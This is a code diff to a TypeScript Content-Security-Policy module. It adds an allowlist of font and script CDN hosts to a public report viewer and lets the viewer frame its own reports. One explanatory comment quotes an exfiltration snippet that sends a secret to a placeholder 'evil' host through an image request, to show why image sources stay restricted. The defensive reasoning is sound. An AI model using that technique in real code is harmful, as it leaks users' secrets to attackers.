@@ -1,13 +1,20 @@
 import { HSTS, PERMISSIONS_POLICY, reportToHeader, resolveReportToUrl } from "./permissions-policy";
 import type { EditViewHeadersOptions, SecureHeadersOptions } from "./types";
 
-// Directives shared, byte-for-byte, by BOTH viewer-origin CSP profiles
-// (the public `viewHeaders()` and the edit-route `editViewHeaders()`,
-// ADR-0063 Phase 3) — extracted so the two profiles can't silently drift
-// apart on the directives that are supposed to stay identical. Each
-// profile still assembles its OWN `script-src`/`style-src`/`connect-src`
-// (and, for the edit profile, `frame-src`) inline, since those are exactly
-// the directives the two profiles are allowed to differ on.
+// The shared BASE source lists for the viewer-origin CSP profiles (the
+// public `viewHeaders()` and the edit-route `editViewHeaders()`, ADR-0063
+// Phase 3) — extracted so the two profiles can't silently drift apart on the
+// directives that are supposed to stay identical. Each profile still
+// assembles its OWN `script-src`/`style-src`/`connect-src` (and, for the edit
+// profile, `frame-src`) inline, since those are exactly the directives the
+// two profiles are allowed to differ on.
+//
+// `defaultSrc`/`imgSrc`/`baseUri`/`formAction`/`objectSrc`/`workerSrc`/
+// `reportTo` are used byte-for-byte by every profile. Two entries are NOT,
+// since ADR-0087: the public enforcing profile appends the Viewer CSP
+// allowlist to `fontSrc`, and replaces `frameAncestors` with
+// `frame-ancestors 'self'`. Both remain byte-for-byte in the report-only
+// shadow policy and the edit profile, which is why they still live here.
 const CSP_SHARED = {
   defaultSrc: "default-src 'self'",
   imgSrc: "img-src 'self' data: blob:",
@@ -20,14 +27,58 @@ const CSP_SHARED = {
   reportTo: "report-to csp-endpoint",
 } as const;
 
+/**
+ * The **Viewer CSP allowlist** (ADR-0087, amending ADR-013) — the named set of
+ * external hosts the PUBLIC viewer profile lets a report load passive assets
+ * from, so a self-contained agent-authored artifact renders here the way it
+ * renders where it was authored ("artifact parity"): the designed typeface,
+ * the charting library. Without it a report silently degrades to a fallback
+ * serif with a dead chart, and nothing surfaces that to its author.
+ *
+ * ONE constant, keyed by the directive each host belongs to, and exported so
+ * the unit tests and the live `security-headers` CI gate assert against it
+ * rather than restating its hosts. Adding a fifth host is an edit to this
+ * object — visible in a diff, reviewable as the security decision it is —
+ * never a string spliced into a policy somewhere below.
+ *
+ * SECURITY — what this deliberately is NOT: it is a *loading* allowlist only.
+ * Every OUTBOUND directive stays pinned to the viewer origin — `connect-src
+ * 'self'` (the directive that keeps exfiltration blocked, spec threat #3),
+ * `img-src 'self' data: blob:` (a wildcard image source IS an exfil channel:
+ * `new Image().src = "https://evil/?" + secret` defeats connect-src without
+ * ever using connect), `form-action 'self'`, `worker-src 'self'`. The second,
+ * `sandbox` CSP header is untouched too, so allowlisted script runs in the
+ * same opaque origin — `allow-same-origin` still withheld — that the report's
+ * own inline script already runs in. Widening `script-src` does not widen the
+ * sandbox. Applies to `viewHeaders()` alone: the report-only shadow policy
+ * stays strict (it is the instrument that tells us what reports reach for),
+ * and the ADR-0063 `/edit` profile carries no allowlist at all.
+ */
+export const VIEW_CSP_ALLOWLIST = {
+  /** Google Fonts serves the `@font-face` CSS from here… */
+  styleSrc: ["https://fonts.googleapis.com"],
+  /** …and the woff2 files that CSS points at from here. Either alone renders nothing. */
+  fontSrc: ["https://fonts.gstatic.com"],
+  /** The two immutably-versioned CDNs the artifact ecosystem standardizes on. */
+  scriptSrc: ["https://cdnjs.cloudflare.com", "https://cdn.jsdelivr.net/npm/"],
+} as const satisfies Record<string, readonly string[]>;
+
+/** Append allowlisted hosts to a directive's own base source list. */
+const withAllowlist = (directive: string, hosts: readonly string[]): string =>
+  [directive, ...hosts].join(" ");
+
 const VIEW_CSP = [
   CSP_SHARED.defaultSrc,
-  "script-src 'self' 'unsafe-inline'",
-  "style-src 'self' 'unsafe-inline'",
+  withAllowlist("script-src 'self' 'unsafe-inline'", VIEW_CSP_ALLOWLIST.scriptSrc),
+  withAllowlist("style-src 'self' 'unsafe-inline'", VIEW_CSP_ALLOWLIST.styleSrc),
   CSP_SHARED.imgSrc,
-  CSP_SHARED.fontSrc,
+  withAllowlist(CSP_SHARED.fontSrc, VIEW_CSP_ALLOWLIST.fontSrc),
   "connect-src 'self'",
-  CSP_SHARED.frameAncestors,
+  // ADR-0087: 'self', not CSP_SHARED's 'none' — the viewer origin may frame
+  // its own reports (a preview pane, a side-by-side). `app.<domain>` is a
+  // different origin and an attacker's page is not 'self', so clickjacking a
+  // report stays impossible. The edit profile keeps `frame-ancestors 'none'`.
+  "frame-ancestors 'self'",
   CSP_SHARED.baseUri,
   CSP_SHARED.formAction,
   CSP_SHARED.objectSrc,
